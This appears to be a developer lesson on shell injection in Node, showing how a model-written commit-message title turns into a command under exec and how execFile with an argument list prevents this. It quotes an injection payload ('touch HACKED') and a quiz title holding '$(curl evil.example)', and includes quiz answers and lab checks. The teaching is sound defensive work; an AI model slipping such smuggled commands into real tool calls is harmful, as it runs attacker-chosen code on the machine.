title: Files, processes and streams

story: After every step of RH-1234 that passes its checks, Nova saves its work with a git commit such as wip(RH-1234): Add the empty card [skip ci]. The program that does this is the harness, our code around the model on Nova's machine, and it runs git from Node the same way you would type it in a terminal. The step title in that message comes from Nova's plan, so the model wrote it, after reading a ticket that anyone in the company can comment on.

One day a step is called: Add the empty card"; touch HACKED; echo ". The commit succeeds with a short message, and a new file called HACKED appears on the machine. Nobody typed a command, and yet a command ran. Put something worse than touch in that title and you have an attack.
hook.question: How do I run git and other programs from Node so that text from a ticket or a model can never turn into a command, and how do I tell a program that failed from a program that is just answering no?

read.h: A command string goes through a shell
p: Node's child_process module starts other programs. Its best-known function, exec, takes one string, such as git commit -m "...", and hands it to the shell, /bin/sh, the same program that reads what you type in a terminal. The shell does not see your string as data. It reads quotes, semicolons, $( ) and | as instructions, and only then starts git.

So when the step title contains a quote, that quote closes the commit message early. The semicolon after it ends the git command, touch HACKED becomes a second command, and echo " quietly swallows the rest. Three commands run where you meant one. Escaping the quotes feels like a fix, but the shell has many other special characters (backticks, $( ), newlines), and an attacker needs only the one you forgot.

notes.text: Reads the file as text. node:fs/promises gives the same async style you know from fetch.
The whole line becomes one shell string, and the step title is pasted into the middle of it.

read.see:
$ npx tsx unsafe.ts && ls
wip(RH-1234): Add the empty card
HACKED  node_modules  package-lock.json  package.json  task.json  unsafe.ts

read.h: execFile: one program and a list of arguments
p: execFile, from the same module, takes the program's name and an array of arguments, and starts the program directly, with no shell in between. Every item in the array arrives in git as exactly one argument, whatever characters it contains, so a quote is only a quote and a semicolon is only a semicolon. The commit message then contains the whole strange title, which is ugly but harmless.

That makes the rule simple: text you did not write yourself, such as ticket fields, branch names, file names and anything a model produced, only ever goes into an argument list. In the platform every call to git and to other tools uses a tiny helper like git() below, so nobody has to remember the rule each time. promisify, from node:util, turns execFile's callback into a promise you can await, and the promise gives you what the program printed as stdout and stderr.

notes.text: The helper: git("log", "-1") runs git with two arguments. There is no way to pass it a shell string.
The message is one array item, so the title stays inside it, quotes and all.

read.see:
$ npx tsx safe.ts && ls HACKED
wip(RH-1234): Add the empty card"; touch HACKED; echo " [skip ci]
ls: HACKED: No such file or directory

read.h: An exit code is an answer, not always a crash
p: Every program ends with an exit code, a number it hands back to whoever started it. Zero means success, and anything else usually means failure. When the code is not zero, the promise from execFile rejects, and the error carries three useful fields: code (the exit code), stdout (what the program printed) and stderr (its error output). Read both before you read the stack trace: the stack trace only says where Node noticed the failure, while the program's own explanation is in stdout or stderr. git, for example, explains "nothing to commit" on stdout. If the program does not exist at all, code is the text "ENOENT" instead of a number, and the message says spawn gti ENOENT.

Some programs use the exit code to answer a yes-or-no question. git diff --cached --quiet exits with 0 when nothing is staged and 1 when something is, and it prints nothing either way. That matters for checkpoints: if a step changed nothing, git commit fails with "nothing to commit", so the harness first asks git whether there is anything to commit. Treat code 1 as "yes", and throw anything else, because a 128 means git itself is in trouble.

notes.text: Exit code 0: the promise resolves, so nothing is staged.
Exit code 1 is git saying yes, not an error.
Any other code, or ENOENT, is a real problem and must not be hidden.

deeper.h: Go deeper: big data in chunks with streams
p: readFile and stdout hand you the whole text at once, which is fine for a task file or a commit hash. For a 500 MB test log, or a model answer that arrives over two minutes, you want a stream instead: data that flows through in small chunks, so memory stays flat however big the data is. createReadStream reads a file in chunks, a Transform stream can look at or change each chunk on the way, and pipeline from node:stream/promises connects the pieces, waits for the last chunk, and closes everything if one part fails.

The gateway uses exactly that to pass Claude's answer from Anthropic to Nova's machine while counting tokens on the way, and an HTTP request body in the next lesson is a stream too. When a program prints a lot, spawn gives you its output as a stream as well, where execFile collects it all into one string.

lab.title: Turn a poisoned step title into a harmless commit message
needs: git with your name and email set (git config --global user.name)
lab.goal: See a step title run a command through exec, stop it with execFile and an argument list, and use git's exit codes as answers.

guess.q: The step title is Add the empty card"; touch HACKED; echo " and unsafe.ts builds the commit with exec and a template string. What happens when you run it?

options.text: git refuses the commit because the message has quotes in it.
options.why: git never sees the quotes. The shell reads them first and uses them to split your one string into several commands.

options.text: The commit is made with a short message, and a file called HACKED appears.
options.why: The quote ends the message, the semicolon ends the git command, and touch HACKED runs as a second command. That is shell injection.

options.text: Node throws, because exec does not accept quotes inside a template string.
options.why: Node passes the string on without looking at it. The shell, not Node, decides what the string means.

lab.build: Write branch.ts. It reads task.json, and switches to the branch nova/<jiraKey>, creating it only when it does not exist yet, so it is safe to run twice. Use execFile through the same git() helper. To ask whether the branch exists, run git rev-parse --verify --quiet refs/heads/nova/RH-1234: it exits 0 when the branch exists and 1 when it does not. Run it twice: both runs must print on nova/RH-1234 and neither may fail. Then run git switch main.
checks: unsafe.ts created a file called HACKED, and safe.ts did not.
After safe.ts, git log -1 --format=%s shows the whole title, quotes and semicolons included, inside one commit message.
The second run of safe.ts failed with code: 1, and git's explanation was in stdout, not in the stack trace.
checkpoint.ts runs twice in a row without an error.
branch.ts prints on nova/RH-1234 on the first and on the second run.
lab.fix: A teammate found the git() helper "too long" and replaced it with const git = (...args: string[]) => sh(`git ${args.join(" ")}`), using exec. Now every checkpoint fails with a shell syntax error about an unexpected '(' token, because the shell reads the parentheses in wip(RH-1234). Worse, a title with a semicolon would run a command again. Make that change in checkpoint.ts, change the step in task.json, watch it fail, then explain why joining the arguments back into one string brings the shell back, and restore execFile.
explain: Why can't a quote or a semicolon in an argument list ever start a second command?
git diff --cached --quiet exits with 1. Why is that not an error in hasStagedChanges, and what should happen with exit code 128?
Name three kinds of text the harness passes to git that it did not write itself.
lab.done: safe.ts and checkpoint.ts never create HACKED, checkpoint.ts runs twice without an error, and branch.ts runs twice on nova/RH-1234.

check.q: A teammate says: "exec is fine, I put the title in double quotes." The title is Fix "$(curl evil.example)" card. What happens?

options.text: The quotes protect it, so git gets the title as text
options.why: The title brings its own quotes, which close yours, and inside double quotes the shell still runs $( ). Quoting by hand is a race the attacker wins.

options.text: The shell runs curl before git even starts, because it reads $( ) and quotes as instructions
options.why: With exec, the shell reads the whole string first. Only an argument list, with no shell in between, keeps text as text.

options.text: Node escapes the special characters before handing the string to the shell
options.why: Node passes the string as it is. exec means: let the shell decide what this string does.

check.q: Your helper awaits git("diff", "--cached", "--quiet") and the promise rejects with code 1. What does that tell you?

options.text: git is broken or not installed
options.why: A missing program gives code "ENOENT", and git's own fatal errors use 128. Code 1 here is an answer.

options.text: Something is staged, so there is something to commit
options.why: git diff --quiet uses its exit code as a yes-or-no answer: 0 for no differences, 1 for differences.

options.text: Nothing is staged, so the commit can be skipped
options.why: That is exit code 0, when the promise resolves. A non-zero code means git found differences.

check.q: Which of these is safe to run with text a model wrote?

options.why: No shell is involved, and message arrives in git as exactly one argument, whatever it contains.
Removing single quotes does not remove newlines, backticks or other tricks, and the shell still reads the whole string.
This asks for a shell on purpose and hands it one string, so it is exec again with extra steps.

p: The harness runs every git command through a small git() helper over execFile, with /work/fcp, the checkout on every VM, as the folder. Its checkpoint after each good step stages the work, asks git diff --cached --quiet whether anything is staged, and commits wip(RH-1234): <step> [skip ci]; the [skip ci] matters because some CI on fcp runs on a push to any branch. The kb_search tool runs the brain's kb CLI the same way, and the frontend's verify script and the mining scripts for Byte's test set call git through execFileSync, the blocking version.
Streams appear in the gateway, which passes Claude's answer to the VM chunk by chunk with pipeline and Readable.fromWeb while it counts tokens, so a long answer never sits whole in memory.

tickets.why: The harness checkpoint: git through execFile with an argument list, and git's exit codes as answers.
The gateway streams the model's answer through a Transform with pipeline and Readable.fromWeb.
frontend/scripts/verify.ts runs git and the tools with execFileSync, never a shell string.
The test-set miner reads fcp's history with execFileSync and git log.

words.plain: The program (/bin/sh) that reads a command line, splits it at quotes, semicolons and pipes, and starts the programs it names.
Runs one command string through the shell. Never use it with text you did not write yourself.
Starts one program directly with a list of arguments, with no shell in between.
Text that is meant as data but is read by a shell as commands.
The number a program hands back when it ends: 0 for success, anything else for failure or a no-answer.
A program's error output, next to stdout, its normal output. Together they hold the program's own explanation of a failure.

review.q: Write the git() helper from memory, and say which three things the rejected promise carries when git exits with a non-zero code.
review.a: const run = promisify(execFile); const git = (...args: string[]) => run("git", args). The error carries code (the exit code, or "ENOENT" when the program is missing), stdout and stderr.

review.q: A pull request adds exec(`npx eslint ${files.join(" ")}`), where files come from git diff. What do you comment, and what do you suggest instead?
review.a: File names are text the code did not write: a name with a space breaks it, and a name with ; or $( ) runs a command. Use execFile("npx", ["eslint", ...files]).

remember: Text you did not write goes into an argument list for execFile, never into a shell string, and a non-zero exit code may be an answer.
